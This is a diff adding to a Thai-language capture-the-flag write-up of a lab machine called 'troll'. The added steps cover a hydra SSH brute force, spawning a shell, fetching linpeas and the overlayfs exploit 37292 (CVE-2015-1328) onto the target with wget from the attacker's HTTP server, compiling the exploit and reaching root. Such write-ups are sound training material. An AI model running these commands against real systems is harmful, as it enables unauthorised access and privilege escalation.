@@ -110,7 +110,7 @@ exit
 - follow
 - tcp stream
 
-text
+มีการส่งไฟล์ secret_stuff.txt
 
 ```
 220 (vsFTPd 3.0.2)
@@ -165,4 +165,252 @@ LIST
 QUIT
 
 221 Goodbye.
+```
+
+ใน packet 40 มี credential บางอย่างคือ "sup3rs3cr3tdirlol" ซึ่งเหมือนจะเป็นชื่อ directory
+
+```
+Line-based text data (3 lines)
+    Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n
+    \n
+    Sucks, you were so close... gotta TRY HARDER!\n
+```
+
+ลองเข้า dir นั้นดู
+
+```
+http://10.101.85.31/sup3rs3cr3tdirlol/
+```
+
+เจอไฟล์ roflmao
+
+![](./images/02.png)
+
+ดาวโหลดและเปิดไฟล์นั้น
+
+```
+cat Downloads/roflmao 
+```
+
+เจอตำแหน่งบางอย่างที่ 0x0856BF
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat Downloads/roflmao 
+
+[...snip...]
+
+Find address 0x0856BF to proceed(����D)���hL���������zR|߃�[^_]��
+
+[...snip...]
+```
+
+ลองเป็นมันใน browser
+
+```
+http://10.101.85.31/0x0856BF/
+```
+
+เจอกับสอง dir ย่อย
+
+![](./images/03.png)
+
+เจอไฟล์ which_one_lol.txt ใน good_luck/
+
+![](./images/04.png)
+
+เปิดอ่าน เหมือนจะเป็นลิสรายชื่อ
+
+```
+maleus
+ps-aux
+felux
+Eagle11
+genphlux < -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+```
+
+เจอไฟล์ Pass.txt ใน this_folder_contains_the_password/	
+
+![](./images/05.png)
+
+เปิดอ่าน อาจจะเป็นรหัสผ่านหรือคำใบ้
+
+```
+Good_job_:)
+```
+
+สร้างรายการ user
+
+```
+nano users.txt
+```
+
+ใส่รายการชื่อที่พบเข้าไป
+
+```
+maleus
+ps-aux
+felux
+Eagle11
+genphlux
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+```
+
+สร้างรายการ password
+
+```
+nano pass.txt
+```
+
+ใส่รายการคำที่น่าจะเป็นรหัสผ่านเข้าไป
+
+```
+Good_job_:)
+maleus
+ps-aux
+felux
+Eagle11
+genphlux
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+```
+
+หลังจากนั้นผมใช้ hydra ในการพยายาม brute force เข้า ssh แต่ไม่สำเร็จ เลยกลับไปอ่านที่ dir this_folder_contains_the_password/	และคาดว่า Pass.txt อาจเป็นรหัสผ่านด้วยเช่นกัน จึงลองทดสอบดู
+
+```
+hydra -L users.txt -p Pass.txt 10.101.85.31 ssh -F
+```
+
+สำเร็จ เราได้ชื่อและรหัสผ่านที่สามารถ ssh ได้แล้ว
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/12]
+└─$ hydra -L users.txt -p Pass.txt 10.101.85.31 ssh -F
+
+[...snip...]
+
+[22][ssh] host: 10.101.85.31   login: overflow   password: Pass.txt
+
+[...snip...]
+```
+
+เข้า ssh
+
+```
+ssh overflow@10.101.85.31 
+```
+
+- password: `Pass.txt`
+
+spawn shell
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+โหลดโปรแกรม linpeas เข้า kail
+
+```
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+```
+
+เตรียมส่งไฟล์
+
+```
+python3 -m http.server 8000
+```
+
+ไปที่ target shell และโหลดโปรแกรมเข้าไป
+
+```
+cd /tmp
+wget http://10.101.55.195:8000/linpeas.sh
+```
+
+สั่งรัน linpeas
+
+```
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+เจอช่องโหว่น่าสนใจคือ overlayfs 3.13
+
+```
+overflow@troll:/tmp$ chmod +x linpeas.sh
+overflow@troll:/tmp$ ./linpeas.sh
+
+[...snip...]
+
+CVE: CVE-2015-1328 | Name: overlayfs | Match data: pkg=linux-kernel,ver>=3.13.0,ver<=3.19.0 | Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic} | Rank: 1 
+
+[...snip...]
+```
+
+กลับไปที่ kali และหา module exploit
+
+```
+searchsploit overlayfs 3.13
+```
+
+เจออันเดียวที่ใช้งานได้คือโมดูล 37292
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/12]
+└─$ searchsploit overlayfs 3.13 
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local P | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local P | linux/local/37293.txt
+---------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+ดึงเข้า kali
+
+```
+searchsploit -m linux/local/37292.c 
+```
+
+โหลดเข้าเครื่องเป้าหมาย 
+
+```
+wget http://10.101.55.195:8000/37292.c
+```
+
+คอมไพล์และรัน
+
+```
+gcc 37292.c -o exploit
+chmod +x exploit
+./exploit
+```
+
+สำเร็จ ผมเป็น root แล้ว
+
+```
+overflow@troll:/tmp$ gcc 37292.c -o exploit
+overflow@troll:/tmp$ chmod +x exploit
+overflow@troll:/tmp$ ./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),1002(overflow)
 ```
